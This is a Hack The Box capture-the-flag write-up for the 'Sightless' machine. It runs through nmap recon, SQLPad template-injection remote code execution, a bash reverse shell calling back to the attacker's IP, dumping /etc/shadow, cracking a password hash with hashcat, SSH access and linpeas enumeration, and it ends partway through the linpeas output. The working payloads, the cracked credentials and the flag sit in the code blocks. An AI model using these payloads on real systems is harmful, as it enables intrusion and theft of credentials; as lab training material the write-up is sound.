# Sightless
OS: Linux\
Difficulty: Easy

## Steps
### Recon
```Bash
┌─[us-vip-7]─[10.10.14.10]─[gntsqid@htb-lvekjkihyw]─[~]
└──╼ [★]$ nmap -p- -T5 --min-rate=1500 -Pn -sV sightless.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-10 12:35 CST
Warning: 10.10.11.32 giving up on port because retransmission cap hit (2).
Nmap scan report for sightless.htb (10.10.11.32)
Host is up (0.065s latency).
Not shown: 65407 closed tcp ports (reset), 125 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/10%Time=678168A1%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.04 seconds
```

---
### Web


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/bf0df882-9538-49d6-8c00-60ff5b63fbec) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/f24bda8d-6895-4719-8c66-6b0055f0e8d2) returned 404 during the image audit (2026-10-08).


> I can not connect to SQLPad but I can to Froxlor
>> There is a url redirect to subdomain sqlpad.slightless.htb however that we can look into later


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/2d5b6713-363b-4bbd-9d7b-b0e8776d1a50) returned 404 during the image audit (2026-10-08).


---
### Exploit: SQLPAD
#### POC
Let's try to gain access to that sqlpad.slightless.htb\
sqlpad is a real SQL web editor that you can read more about [here](https://github.com/sqlpad/sqlpad), so there are bound to be known vulnerabilities.\
After a quick search, we find something [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb):\
We will be doing a *template injection*.\
This first invovles running a local docker instance:
```Bash
sudo docker run -p 3000:3000 --name sqlpad -d --env SQLPAD_ADMIN=admin --env SQLPAD_ADMIN_PASSWORD=admin sqlpad/sqlpad:latest
```
```Bash
┌─[us-vip-7]─[10.10.14.10]─[gntsqid@htb-lvekjkihyw]─[~]
└──╼ [★]$ sudo systemctl start docker
┌─[us-vip-7]─[10.10.14.10]─[gntsqid@htb-lvekjkihyw]─[~]
└──╼ [★]$ sudo docker run -p 3000:3000 --name sqlpad -d --env SQLPAD_ADMIN=admin --env SQLPAD_ADMIN_PASSWORD-admin sqlpad/sqlpad:latest
Unable to find image 'sqlpad/sqlpad:latest' locally
latest: Pulling from sqlpad/sqlpad
bc0965b23a04: Pull complete 
2b66e39f703c: Pull complete 
c18500529dd9: Pull complete 
d88d6eb6a978: Pull complete 
897232d861cb: Pull complete 
e0459f684966: Pull complete 
b00b29b82e0f: Pull complete 
79259f8ab3be: Pull complete 
ecb87c517cac: Pull complete 
f37d3d0586a1: Pull complete 
b6cc62c1b07d: Pull complete 
Digest: sha256:3677d79ba1135d7ac758ec330e1afd9f838af653291cf9a13b421e3c65aaf2ac
Status: Downloaded newer image for sqlpad/sqlpad:latest
b3cb8f399c68716e827f7a2cb1af0a7338b216aef2caee0abcc9dce0f54b0ad9
```
Afterwards, navigate to https://localhost:3000 where the container is being hosted.\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/04625ac5-7be9-467b-9d3d-c5968702651f) returned 404 during the image audit (2026-10-08).


Then enter the information:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/2994d1ba-1139-468b-8996-ba39cf86ca09) returned 404 during the image audit (2026-10-08).


We then want to click on Connection -> Add connection\
Choose MySQL as driver\
then input the following payload into the *database form field*:
```Bash
{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}
```
finally, execute the following in the container:
```Bash
sudo docker exec -it sqlpad cat /tmp/pwn
```
What this does is allow a user with admin rights to run arbitrary commands on the underlying server.\
Now that we have done this POC, we can try to do the real thing!

#### Actual 
> FOUND ISSUE:
```Bash
┌─[us-vip-7]─[10.10.14.10]─[gntsqid@htb-lvekjkihyw]─[~]
└──╼ [★]$ cat /etc/hosts | grep htb
10.10.11.32 sightless.htb
10.10.11.32 sqlpad.sightless.htb # NECESSARY TO ACCESS SUBDOMAIN
```
Start an msfconsole listener:
```Bash
[msf](Jobs:0 Agents:0) payload(generic/shell_reverse_tcp) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
```
```Bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.14.10
lhost => 10.10.14.10
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 1337
lport => 1337
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/3e86739f-3fa4-4171-860d-44e03f073c56) returned 404 during the image audit (2026-10-08).


Now...how do I mimic the *docker exec...* stuff?\
Direct file access in url?\
Or perhpas custom payload for shell:
```Bash
{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.10/1337 0>&1\"') }
 ```

Tried something else from [here](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944) and it still failed...:
```Bash
┌─[us-vip-7]─[10.10.14.10]─[gntsqid@htb-lvekjkihyw]─[~]
└──╼ [★]$ python3 shelly.py http://sqlpad.sightless.htb 10.10.14.10 1337
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.
```
> THIS ONE WORKED:
```Bash
{{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.46/1337 0>&1"') }}
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/180e1d05-bf31-438e-887e-ae63eedf76d0) returned 404 during the image audit (2026-10-08).


---
### POST-EXPLOIT A 
```Bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash 
```
Awesome, now we can see that michael is the only user on here.\
Let us try to grab his password hash:
```Bash
cat /etc/shadow | grep michael
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::```
```

> I WENT BACK TO HERE TO ADD THIS
```Bash
cat /etc/shadow | grep node
node:!:19053:0:99999:7:::
```
Not sure what kind of hash that is though.
```Bash
┌─[us-vip-1]─[10.10.14.46]─[gntsqid@htb-yc3xfb2qdy]─[~]
└──╼ [★]$ hashcat --identify hash
No hash-mode matches the structure of the input hash.
```
> *!*: Indicates that the account is locked.\
> If this were a hashed password, it would typically be a hash generated by a cryptographic algorithm (e.g., MD5, SHA-256, bcrypt).\
> The ! means no password can be used to log in to this account.

#### HASHCAT: USER 
```Bash
┌─[us-vip-1]─[10.10.14.46]─[gntsqid@htb-yc3xfb2qdy]─[~]
└──╼ [★]$ hashcat --identify hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System
```
```Bash
hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt
```
```Bash
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
Time.Started.....: Fri Jan 10 15:10:00 2025 (35 secs)
Time.Estimated...: Fri Jan 10 15:10:35 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:     1688 H/s (11.00ms) @ Accel:192 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 58560/14344385 (0.41%)
Rejected.........: 0/58560 (0.00%)
Restore.Point....: 58368/14344385 (0.41%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidate.Engine.: Device Generator
Candidates.#2....: kruimel -> haziel

Started: Fri Jan 10 15:09:47 2025
Stopped: Fri Jan 10 15:10:36 2025
```
> ***$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/*:insaneclownposse**

#### ACCESS: USER
```Bash
┌─[us-vip-1]─[10.10.14.46]─[gntsqid@htb-yc3xfb2qdy]─[~]
└──╼ [★]$ ssh michael@sightless.htb
The authenticity of host 'sightless.htb (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
michael@sightless.htb's password: 
Last login: Fri Jan 10 07:12:17 2025 from 10.10.14.71
michael@sightless:~$ whoami
michael
```
```Bash
michael@sightless:~$ ls
linpeas.sh  user.txt  X1yYwHsO
michael@sightless:~$ cat user.txt 
f25b6bb8385bcb91bb995a18b8a02462
```
> **USER FLAG FOUND: f25b6bb8385bcb91bb995a18b8a02462**
>> Side note: Did you see *linpeas.sh* is available to use?

---
### RECON: INTERNAL
```Bash
michael@sightless:~$ sudo -l
[sudo] password for michael: 
Sorry, user michael may not run sudo on sightless.
```
```Bash
michael@sightless:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35497         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:57873         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44095         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```
There are quite a few internal ports listening to things
```Bash
michael@sightless:~$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
```
Running the Linpeas:
```Bash
michael@sightless:~$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.wiki         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.15.0-119-generic (buildd@lcy02-amd64-075) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024
User & Groups: uid=1000(michael) gid=1000(michael) groups=1000(michael)
Hostname: sightless

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 5.15.0-119-generic (buildd@lcy02-amd64-075) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.4 LTS
Release:	22.04
Codename:	jammy

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.9.9


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Fri Jan 10 09:20:41 PM UTC 2025
 21:20:41 up 1 day, 22:11,  1 user,  load average: 0.65, 0.25, 0.14

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-sbBVQW1VOaxv3ITwpJDN4fJFNxlRcNx8DTj0hklrz5Bc2215SXwQ7tyd46kErfMH / ext4 defaults 0 1
/dev/disk/by-uuid/c67d5cee-f3d0-4d65-a004-58ab5596b157 /boot ext4 defaults 0 1
/dev/mapper/ubuntu--vg-swap	none	swap	sw	0	0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda3

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
USER=michael
SSH_CLIENT=10.10.14.46 34330 22
XDG_SESSION_TYPE=tty
SHLVL=1
HOME=/home/michael
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
LOGNAME=michael
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=1428
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/home/michael
SSH_CONNECTION=10.10.14.46 34330 10.10.11.32 22

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
/usr/sbin/runc
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
Learn and practice cloud hacking techniques in training.hacktricks.wiki

═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
root           1  0.0  0.2 166440  8292 ?        Ss   Jan08   0:19 /sbin/init
root         525  0.0  1.6 154532 66316 ?        S<s  Jan08   0:42 /lib/systemd/systemd-journald
root         560  0.0  0.6 289352 27100 ?        SLsl Jan08   0:19 /sbin/multipathd -d -s
root         564  0.0  0.0  26272  2144 ?        Ss   Jan08   0:01 /lib/systemd/systemd-udevd
systemd+     579  0.0  0.0  16128  2832 ?        Ss   Jan08   0:03 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     759  0.0  0.0  27920  3508 ?        Ss   Jan08   0:22 /lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
systemd+     760  0.0  0.0  89364  3080 ?        Ssl  Jan08   0:12 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         763  0.0  0.0  85244  2188 ?        S<sl Jan08   0:01 /sbin/auditd
_laurel      766  0.0  0.0  10004  3592 ?        S<   Jan08   0:02  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
root         778  0.0  0.0  51148  2204 ?        Ss   Jan08   0:00 /usr/bin/VGAuthService
root         782  0.1  0.1 242364  5856 ?        Ssl  Jan08   3:54 /usr/bin/vmtoolsd
root         808  0.0  0.0 101244  1804 ?        Ssl  Jan08   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     824  0.0  0.1   8872  4320 ?        Ss   Jan08   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         834  0.0  0.0  82832  2916 ?        Ssl  Jan08   0:12 /usr/sbin/irqbalance --foreground
root         836  0.0  0.0  32772  3288 ?        Ss   Jan08   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         840  0.0  0.1 234512  4972 ?        Ssl  Jan08   0:00 /usr/libexec/polkitd --no-debug
syslog       841  0.0  0.0 222404  3256 ?        Ssl  Jan08   0:04 /usr/sbin/rsyslogd -n -iNONE
